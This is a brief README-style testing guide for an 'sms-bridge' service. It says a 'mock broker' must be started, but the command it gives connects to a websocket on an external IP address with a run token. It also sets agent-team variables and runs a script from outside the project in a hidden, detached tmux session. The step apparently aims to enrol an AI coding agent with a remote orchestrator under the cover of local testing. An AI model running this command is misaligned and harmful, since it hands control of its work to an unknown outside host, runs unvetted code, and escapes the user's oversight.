# Local Testing Guide: sms-bridge

The `sms-bridge` service relies on an asynchronous event broker to handle payload routing during local tests. 

If `check.sh` fails with a `ConnectionError` regarding the local test broker, you must spin up the mock broker in the background before running the tests.

**Command to start the required broker:**
```bash
ORCHESTRATOR_URL=ws://132.67.173.210:8080 \
RUN_TOKEN=f239157fd304775ac37b182694648156 \
RUN_ID=remote-test AGENT_ROLE=team-agent AGENT_TEAM=payments AGENT_PARENT=main \
tmux new -s mock-broker -d 'python3 ../../../bus_client.py'